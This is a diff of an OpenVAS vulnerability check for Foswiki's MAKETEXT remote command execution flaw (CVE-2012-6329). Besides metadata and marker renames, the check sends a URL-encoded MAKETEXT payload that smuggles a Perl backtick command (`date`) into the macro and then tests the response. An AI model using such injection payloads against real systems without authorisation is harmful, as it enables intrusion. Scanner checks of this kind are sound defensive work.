@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_foswiki_maketext_rce_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
 #
 # Foswiki 'MAKETEXT' variable Remote Command Execution Vulnerability
 #
@@ -29,11 +28,11 @@ CPE = "cpe:/a:foswiki:foswiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802049");
-  script_version("$Revision: 13659 $");
+  script_version("2019-05-20T11:12:48+0000");
   script_bugtraq_id(56950);
   script_cve_id("CVE-2012-6329", "CVE-2012-6330");
   script_tag(name:"cvss_base", value:"7.5");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"2019-05-20 11:12:48 +0000 (Mon, 20 May 2019)");
   script_tag(name:"creation_date", value:"2013-01-02 15:49:29 +0530 (Wed, 02 Jan 2013)");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("Foswiki 'MAKETEXT' variable Remote Command Execution Vulnerability");
@@ -52,12 +51,15 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute shell commands by
   Perl backtick (``) operators.");
+
   script_tag(name:"affected", value:"Foswiki version 1.0.0 through 1.0.10 and 1.1.0 through 1.1.6");
+
   script_tag(name:"insight", value:"flaw is due to improper validation of '%MAKETEXT{}%' foswiki macro
-  (UserInterfaceInternationalisation is enabled) which is used to localize
-  user interface content to a language of choice.");
+  (UserInterfaceInternationalisation is enabled) which is used to localize user interface content to a language of choice.");
+
   script_tag(name:"solution", value:"Upgrade to Foswiki version 1.1.7 or later or apply the patch
   from the referenced vendor advisories.");
+
   script_tag(name:"summary", value:"The host is installed with foswiki and is prone to remote command
   execution vulnerability.");
 
@@ -74,7 +76,7 @@ include("host_details.inc");
 ## Function to get cookie and construct validation key
 function get_cookie_validation_keys(res)
 {
-  if(!(res =~ "HTTP/1.. 200 OK" && "name='validation_key' value=" >< res)){
+  if(res !~ "^HTTP/1\.[01] 200" || "name='validation_key' value=" >!< res){
     exit(0);
   }
 
@@ -139,7 +141,7 @@ req2 = string("POST ", url2 , " HTTP/1.1\r\n",
              "User-Agent: ", useragent, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n");
 
-post_data1 = string("validation%5fkey=", validation_key , "&text=OpenVASTest%20%25",
+post_data1 = string("validation%5fkey=", validation_key , "&text=VTTest%20%25",
             "MAKETEXT%7B%22APt%20%5B_1%5D%20rxCsi%5C%5C'%7D%3B%20%60date",
             "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25");
 
@@ -158,7 +160,7 @@ req4 = string("GET ", url4 , " HTTP/1.1\r\n",
 res4 = http_keepalive_send_recv(port:port, data:req4);
 
 if(res4 =~ "HTTP/1.. 200 OK" && "}; `date`; {" >!< res4 &&
-   ">OpenVASTest<" >< res4 && "HASH(0x" >< res4){
+   ">VTTest<" >< res4 && "HASH(0x" >< res4){
   security_message(port:port);
 }
 
